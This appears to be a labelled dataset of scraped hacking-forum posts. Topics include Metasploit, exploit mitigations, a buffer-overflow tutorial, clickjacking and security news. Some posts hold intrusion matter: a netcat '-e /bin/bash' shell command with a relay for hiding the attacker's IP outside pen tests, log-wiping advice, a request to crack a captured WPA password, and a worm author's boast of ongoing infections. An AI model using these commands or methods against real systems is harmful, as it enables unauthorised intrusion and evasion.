"  OWASP Security Shepherd <br> <br>Security Shepherd has been designed and implemented with the aim of fostering and improving security awareness among a varied skill-set demographic. This project enables users to learn or to improve upon existing manual penetration testing skills. This is accomplished through lesson and challenge techniques. A lesson provides a user with a lot of help in completing that module, where a challenge puts what the user learned in the lesson to use. Utilizing the OWASP top ten as a challenge test bed, common security vulnerabilities can be explored and their impact on a system understood. The bi-product of this challenge game is the acquired skill to harden a players own environment from OWASP top ten security risks The modules have been crafted to provide not only a challenge for a security novice, but security professionals as well. Security Shepherds vulnerabilities are not simulated, and are instead delievered through hardened real security vulnerabilities that can not be abused to compromise the application or it\'s environment. Many of these levels include insufficient protections to these vulnerabilities, such as black list filteres and poor security configuration. Security Shepherd includes everything you need to complete all of it\'s levels including the OWASP Zed Attack Proxy Project and portable browsers already configured for proxy use. <br>Topic Coverage The Security Shepherd project covers the following web application security topics; <br> <br> SQL Injection Cross Site Scripting Broken Authetication and Session Management Cross Site Rrequest Forgery Insecure Direct Object Reference Insecure Cryptographic Storage Failure to Restrict URL Access Unvalidated Redirects and Forwards Insufficient Transport Layer Security <br>Download","D4Garage4hackers","NO"

"  Do you keep an interview diary? Do you make interview notes? <br> <br>In my point of view it is very important to take notes right after each interview you appear in. Freshers might ask - How would it help? Let\'s analyze ... <br> <br>I generally note down following stuff after I appear in an interview: <br>1. The recruiter name who brought the opportunity <br>2. The interview attendees (name and designations) <br>3. Time and day of interview <br>4. Kind of interview - telephonic/video-conference/face-to-face <br>5. Questions asked during interview and analysis what I did right, what could have gone a little better and what steps could be taken to tackle them better next time. <br> <br>Benefits:- <br>1. Good terms with recruiters could help you in future job hunting as they would know what you are good at. Linkedin is good for that. <br>2. Your industry awareness (people and their designations) marks positive impression on employer. <br>3. While interacting with multiple employers at the same time, these notes would help avoid confusion. <br>4. Analysis of questions asked, your replies, your mistakes etc. would help you prepare better for next interviews - be them immediate or later in career. <br>5. The questions galore would help you conduct interviews someday. So you are in fact collecting good questions for free, without using brain <br> <br>Anyway, the most important part is the introspection and you gotta work on your short comings with each interview. <br> <br>Friends, your inputs are highly appreciated. <br> <br>""Don\'t be like the 95% of humanity who say they will follow up on something, but never do.""","D4Garage4hackers","NO"

"  There are various situations where instead of keeping configurations in the python script, we might need to keep an external config file. The advantage of keeping a config file is that then multiple scripts can access and use that conf file. The way Python provides this facility is via a library ""ConfigParser"". This library provides all the methods necessary to parse your config file.A great tutorial for the library can be found here - https:../docs.python.org/2/library/configparser.html and here - https:../pymotw.com/2/ConfigParser/default.htm. In this post, I\'ll show a basic usage case of ConfigParser.  Example of config file (example.conf):   Code: [global]path = /tmp/files/time = 90[app]restart = True The above config file contains two sections, global and app. We\'ll see how to parse this in following py scripts.   Code: #!/usr/bin/env pythonimport ConfigParserconf_parser = ConfigParser.ConfigParser() # Making a ConfigParser objectconf_parser.read(""example.conf"") # The config file to parsepath = conf_parser.get(""global"", ""path"") # Getting `path` setting from `global` sectionapp_time = conf_parser.getint(""global"", ""time"") # Getting integer valuerestart = conf_parser.getboolean(""app"", ""restart"") # Getting boolean valueprint path, app_time, restart # Prints the config values That\'s it, pretty simple. For more detailed explanations and examples, please check out the mentioned resources. Hope this helps.  Cheers, c0dist","D4Garage4hackers","NO"

Long Answer: In normal scenario router wont give away directly the machine behind the router. You are talking about a home router or business router ? If it is home router by default all incoming connections will be blocked. Unless the user has set any port forwarding rule or setup a machine in DMZ network. In case of some port fowarding is setup router wont let you know information to which inside IP the port is forwarded it would just show as open port of the public IP address of the router. In this scenario you would can pass packets directly to the service running behing the port forward (any inside machine that is configured in portforward). But packets would be forwared to only that specific port.  Hope this clears your doubt.   neo, I\'ve tried with TP-Link & D-Link ADSL modem + routers, both are home routers and the IP used was of the ISP alloted one. Could that be a problem? Anyway, let me try if anything possible through that forwarded port, if any. Thank you neo.  Regards, r0B-O","D4Garage4hackers","NO"

"  For more than a decade now, Gera\'s Warming Up on Stack page lists many vulnerable C programs that I guess almost everyone (who\'s into Exploitation/Overflows stuff) might have tried. State of exploitation has evolved considerably over these years. Now there are numerous ways in which these programs can (and can not) be exploited.  I wanted to highlight the implications of mitigation techniques (think ASLR, NX, SSP, RELRO, etc.) that we have at our disposal today. Successful exploitation requires either bypassing these techniques or turning them off. For initial few posts I\'m focusing on the latter. Please find links below:  7h3rAm\'s InfoSec Ramblings: Exploit Mitigation Techniques on Linux Systems 7h3rAm\'s InfoSec Ramblings: Gera\'s Warming Up on Stack #1 - Solutions  The first post details steps required to enable/disable various mitigation techniques on Linux systems. The next post outlines possible solutions for the first example program on Gera\'s page (stack1.c). I\'ve tried to include some basic stuff like calling conventions, call stack layout, standard approach towards shellcode writing, compiler optimizations, etc apart from talking about the solutions alone. This post emphasizes on how difficult exploitation is in presence of a mitigation technique and how its absence paves way for more fun. However, real fun would start when you actually bypass mitigation schemes using advanced exploitation techniques that I have left for future posts.

I would like to share it here  EXITFUNC option is set to \'thread\' by default, and it works fine in most cases, so we don\'t usually look into it much. But in some situations specifying a different EXITFUNC is necessary so that you can have a clean exit from the exploited box.  There are 3 different values for EXITFUNC : thread, process, seh  thread: This method is used in most exploitation scenarios where the exploited process (e.g. IE) runs the shellcode in a sub-thread and exiting this thread results in a working application/system (clean exit)  process: This method should be used with multi/handler. This method should also be used with any exploit where a master process restarts it on exit.  seh: This method should be used when there is a structured exception handler (SEH) that will restart the thread or process automatically when an error occurs.","D4Garage4hackers","NO"

So, is it recommended to use "" `basename 0` "" or ""$0"" accordingly, or just replace ""linux_log_eraser.sh with ""Wipe_Linux_Logs-v0.2.sh"" I would still recommend you to implement, it little user interactive, which obviously reduces plenty of code like, instead of user to manipulate the script itself for adding more log files, why not using STDIN the absolute path of the logfiles or just read file name checking for file exists on log locations, something like, ""locate $1""  Other thing is ""positional parameter checking"", if pass "" ./Wipe_Linux_Logs-v0.2.sh 123 "" it still go mess with logfiles, try to restrict the script to use only those parameters mentioned in the script. everything else should be forced to exit().  Applying with correct parameter/option with the file specified by the user, we can completely takeoff the overhead/process of some function like, ""fuck_log_files()"". etc. even-more, there are some circumstances where we don\'t need mess around with whole log structure, instead we just need to erase a particular file, so, it would be better to implement a logic, to just erase a particular file, where we just don\'t need overhead.

"Metasploit is an exploitation framework widely use by hackers, pen testers and security researchers. The Metasploit Framework is a tool for developing and executing exploit code against a remote target machine. The Metasploit Project is also well-known for anti-forensic and evasion tools, some of which are built into the Metasploit Framework Background: Metasploit was created in 2003 as a portable network game using the Perl scripting language. Later, the Metasploit Framework was then completely rewritten in the Ruby programming language. It is most notable for releasing some of the most technically sophisticated exploits to public security vulnerabilities. In addition, it is a powerful tool for third-party security researchers to investigate potential vulnerabilities. On October 21, 2009 the Metasploit Project announced that it had been acquired by Rapid7, a security company that provides unified vulnerability management solutions. -------------------------------------------------------------------------------------------------------------------- In this tutorial, I will discuss using metasploits, its commands and its advantages. Now we all have come to know that its a famous exploitation framework used widely. So lets start Installing on windows:- Download the installer from the site and install it Installing on Linux:- Refer to metasploit Linux support for installation on linux : http://www.metasploit.com/framework/support/ Lets get familiar with some common terms to be used: Exploit: It is the way of getting into the system via a vulnerability or bad setup/configuration. Payload: It is what we want the exploit to do. A kind of configuration for attack Auxillary: They are other applications which come with metasploit like teh scanners, detectors and the sniffers Encoders: With a lot of exploits anti viruses pick them up when an attacker tries to execute the victim box. And what the encoders do is somewhat jumble the code so it makes it a hell of a lot harder for anti viruses to detect them. Very handy.","D4Garage4hackers","NO"

"  Hello Hackers ; In scenarios other than pen testing, we normally have to avoid reverse shell. The reason is simple ... We have to use our own IP. And as you know .... now a days everyone uses NAT. So i just came up with something which can let us feel little easy. I dont know if you have been doing it with use of something else ... But i wrote a script to convert ""reverse shell"" to ""forward shell"". The only thing is ..... you will need a zombie for this to work. The script is simply a socket program with two servers at a time. One will listen for the ""reverse shell"" from your target and other will listen for a connection from you. And it will cross-send the data from one socket to anather. So now you can connect to a reverse shell via a long proxy chain. Here is an example use of the code to have a netcat shell : We are gonna run our script on the zombie machine. The script will open up 2 of the ports. say for instance port no. 50007 and port no. 5000 Now lets through a reverse shell to the port 50007 of zombie from the target machine nc -vv -e /bin/bash 127.0.0.1 50007 Now on the attacker machine we will do a normal netcat connect to port 5000 of the zombie nc -vv 127.0.0.1 5000 And you are done ....

"  @punter and Thats_all <br> <br>correct me if I am wrong but 32 is the limit of IPs you can configure for scanning at one time. After you finish the scan you could just edit the same site and change the asset list so that it contains new IPs list. This neither removes IPs from dashboard and at the end of the day you could get a report of ALL the ips that have been scanned. Also if needed you can still generate SCAN wise reports. For eg. <br>you need to scan 80 IPs - scan 30 IPs first - edit sites - replace it with new 30 ips - scan them - edit site and replace asset list with remaining 20 ips - scan them <br> <br>Now in the dashboard u will be able to see results for all 80 IPs.

"  @pete+the_ram, Most of the time service such as apache do not run under root, and if it is running as root then you dont even need to use any local root exploit as you already have root privileges and my answer was specific to prince_indishell question. <br> <br>as he already mentioned in his question: <br> <br>      Originally Posted by prince_indishell   suppose i am a hacker , i have hacked into a website and got a back connect on netcat <br>but i will be that user who is the user of the site <br> <br>so to become root , i need some locale exploit and have to run it <br> <br>... <br> <br>but what my thought was , instead of finding local exploit and compile it and run it    so here, if he compile vulnerable binary and run it on server then in this case the vulnerable binary will run with the same privileges with website user so he will not be able to gain root access with this. <br> <br>hope your doubt got clear. <br> <br>if still have questions shoot them up ","D4Garage4hackers","NO"

"  [+]Written By D4rk357 [+]Special thanks to Peter Van Eckhoutte for his awesome Exploit writing series . [+]Thanks to Fb1h2s for helping me out in the way [+]garage4hackers  In this tutorial i will start from scratch and build a working exploit.  A public exploit for this is already available here http://www.exploit-db.com/exploits/15480/ First step is downloading and installing the vulnerable application from here http://www.exploit-db.com/application/15480  Install Immunity Debugger or ollydbg or windbg anyone of it would do .  Now we will write a simple python code which will generate a .wav file and test the application against it .  Code: handle=open(""crash.wav"",""a"")Crap=""\\x41""*30000handle.write(Crap) This little code upon execution will generate a file with the name of crash.wav  Open the debugger of your choice in my case immunity debugger . Open the Executable of CD to MP3 converter and then click on execute.  Open  Execute   Now open your Crash.wav file in CD to MP3 converter in option wav to wav converter and BOOM the application Dies instantly . NOw check your Debugger for what exactly happened .    Woot Woot Eip has been overwritten . Not only EIP but a few more registers have been overwritten thus increasing our chance to make a Working exploit for this vulnerability.","D4Garage4hackers","YES"

"  We will understand how to walk through a PEB data structure in win32 environment.  Process Environment Block is an important data structure from an exploiter\'s perspective. A shellcode executes a set of function APIs and for this it must locate and load them.  A common way of doing this is to make use of LoadLibraryA function which is exported by kernel32.dll OS module.  I showed in my previous article about IATs and EATs, that we can parse the EAT of a loaded module to find out the address of a function API exported by the module.  Similarly, if we can find the base address of kernel32.dll then we can parse it\'s Export Address Table and locate LoadLibraryA or LoadLibraryW functions which can further be used to load and execute the functions used by shellcode.  This is not a new technique and there are snippets available on the net which show you how to do this using assembly language code. What I felt after reading them is, there is not a good explanation provided along with those codes to describe what they are doing.  So, I will make use of windbg to walk through the assembly language code which is used to locate the base address of kernel32.dll  First let\'s explore the Process Environment Block. I attach my windbg to notepad.exe on a Win XP SP3 platform.  PEB is located within the virtual address space of the loaded process. This address is most often, 7ffda000 but not always. There are different ways to get the PEB base address in the process VA space.","D4Garage4hackers","NO"

"  ClickJacking is a little bit difficult to explain however try to imagine any button that you see in your browser from the Wire Transfer Button on your Bank, Post Blog button on your blog, Add user button on your web-site, Google Gadgets etc. ClickJacking gives the attacker to ability to invisibly float these buttons on-top of other innocent looking objects in your browser.  So when you try to click on the innocent object, you are actually clicking on the malicious button that is floating on top invisibly.  In other words, the attack is thrown by a malicious web page embedding objects, possibly from a different site, such as framed documents or plugin content (Flash, Silverlight, JavaÂ) which may lead to unwanted results if clicked by the current user (e.g. a ÂDelete all messagesÂ button in your webmail or an advertisement banner in a click fraud scheme). Using DHTML, and especially CSS, the attacker can disguise or hide the click target in several ways which go completely undetected by the user, whoÂs easily tricked into clicking it in a more or less blind way.  JavaScript increases the effectiveness of these attacks hugely, because it can make our invisible target constantly follow the mouse pointer, intercepting userÂs first click with no failure.  We can however imagine a few less effective but still feasible scriptless scenarios, e.g. covering the whole window with hidden duplicates of the target or overlaying an attractive element of the page, likely to be clicked (e.g. a game or a porn image link), with a transparent target instance.

This is a profession where a lot is at stake and the systems that are being managed are complex and often difficult to integrate. However, not all IT pros are good at admitting when they make a mistake. Many of them take advantage of the fact that business managers (and even some high-level technical managers) donÂt have a good understanding of technology, and so the techies will use jargon to confuse them (and cover up the truth) when explaining why a problem or an outage occurred. For example, to tell a business manager why a financial application went down for three hours, the techie might say, ÂWe had a blue screen of death on the SQL Server that runs that app. Damn Microsoft!Â What the techie would fail to mention was that the BSOD was caused by a driver update he applied to the server without first testing it on a staging machine..............

A report presented to Congress on Wednesday said the firm rerouted email traffic to and from websites of the US Senate, the Department of Defence, and ""many others"" including national space agency NASA for 18 minutes on 8 April.  The rerouting began at a smaller Chinese internet service provider called IDC China Telecommunication before being propagated by China Telecom, said the report, compiled by the US-China Economic and Security Review Commission.  However the listed arm of China Telecom, one of the country\'s major telecommunications operators, said in a statement emailed to AFP that the company ""denied any hijack of internet traffic"".

"  China is often blamed for launching online attacks, but the evidence is almost always circumstantial. Many of the targeted espionage trojans seem to come from China, but we can\'t actually prove it.  However, some new evidence has just surfaced.  On 17th of July, a military documentary program titled ""Military Technology: Internet Storm is Coming"" was published on the Government-run TV channel CCTV 7, Millitary and Agriculture (at military.cntv.cn).  The program seems to be a fairly standard 20-minute TV documentary about the potential and risks of cyber warfare. However, while they are speaking about theory, they actually show camera footage of Chinese government systems launching attacks against a U.S. target. This is highly unusual. The most likely explanation is that this footage ended up in the final cut because the editor did not understand the significance of it.  Here\'s the critical snippet from the program:   Rough translations of the texts shown in the dialog:   People\'s Liberation Army Information Engineering University   Select Attack Destinations   Target IP   List of Falung Gong sites   Falun Dafa in North America  Falun Dafa website  Meng Hui website  Witnesses of Falun Gong website 1  Witnesses of Falun Gong website 2   ATTACK CANCEL  The targets listed in the tool are related to Falun Gong or Falun Dafa Â a religious organization that is banned in China. In particular, the attack is launched against an IP address, 138.26.72.17, which belongs to a U.S. University. What kind of an attack is launched remains unclear.

"  running two os in one machine is called dual boot... <br> <br>Debian 6.0 is a good choice you can also look at fedora or Arch Linux. <br> <br>all can run in 512 MB ram. <br> <br>Check online for dualboot setup guideline. <br> <br>basically you will need some empty space on your harddisk. <br>in form of either fully empty partition or free space which can then be used by linux for its own purpose. I would recommend giving linux atleast 10-20GB of space. <br>although a installation of debian or arch or fedora won\'t take more then 508 GB but as soon as you start installing more and more software you will feel the need of space. <br> <br>as you are having small ram you can boost the performace by having a swap space. <br>when you start linux installation at one point you will have to select the partitions in that case you can use one single partition with <br>mount point : / <br>size : 10-20 GB depends on what you gave. <br>partition type : ext3 <br> <br>and one more partition of 1-1.5GB <br>mount point : none <br>partition type : swap space <br> <br>that should help. <br> <br>you can fire more specific questions when you work on the setup... <br>also you can login to IRC when you work on setup part to get help from there. <br> <br>remember to do all check\'s before starting the installation...... otherwise this may lead to waste of time and efforts.","D4Garage4hackers","NO"

My only real concern with this book is that it might lack the focus required by a normal investigator. I\'m sure many investigators simply want to know where to find key data (email, Web history, etc.) and then retrieve and analyze it in a forensically sound manner. It\'s the ""so what"" question that hangs over many forensics books. I would have liked a case study focusing on that sort of material to show how an investigator would make sense of the data and structures unearthed by the author throughout the book.  - Original Info by Richard Bejtlich","D4Garage4hackers","NO"

Well my computer does 700k/s but I managed to make hash tables with genpmk which made the process a little faster. I have tried the following dictionaries:  RockYou(Not sure if it was the full version, had about 2 million words) Darkcode.lst Two smaller 10 thousand word dictionaries I forget the name of.  I have also submitted it to online hash crack which after ~5 days said not found. Also, I tried the free version of GPUHASH.me with the 2GB dictionary and it could not find it.  So as you can see, this is a challenging password. I would love if some of you fellow hackers with good hardware and dictionaries could try to crack this!

The company has been scrambling to save data and get customers back online or moved to safe servers since the security breach occurred over a week ago, but has largely failed to recover data from the affected serverÂs shared servers.  A technical expert working on the recovery has described the incident as Âthe largest IT disruption that has ever happened in Australia.Â Initial speculation and timing of the incident pointed the finger at hacking group LulzSec. However, a notorious local hacker going by the tag ÂPseudonym of Evil from efnetÂ, was subsequently rumoured to be behind it following a defacement message appearing on the company\'s website. Neither have been confirmed as the culprits.  Distribute.IT continues to work with the Australian Federal Police to trace the architect of the attack but source close to the matter claim that the incident is less hack and more industrial espionage  complete news","D4Garage4hackers","YES"

"  It nearly took 3 months dedicated and then next 3 months ppart time to remove bugs from it. The original beast is nearly 4000-5000 lines and is more robust.  But its a less vigorous version leaked from my system and is still infecting in some parts of the world. Though that has several bugs and is not completely developed so has some plaintext values along with mixup of scrambled strings.   The time taken to develop a worm depends upon its motto and the team and their expertise.  At an average it takes nearly 3-6 months to just live-&-survive state and then the more time is invested to keep its next versions uptodated and anti-antivirus signature defeating and more functionality adding needs more time.  Clearly a single stealth virus can takeup at an average 2-5 years and will depend upon its team behind the scenes...""vinnu""","D4Garage4hackers","NO"
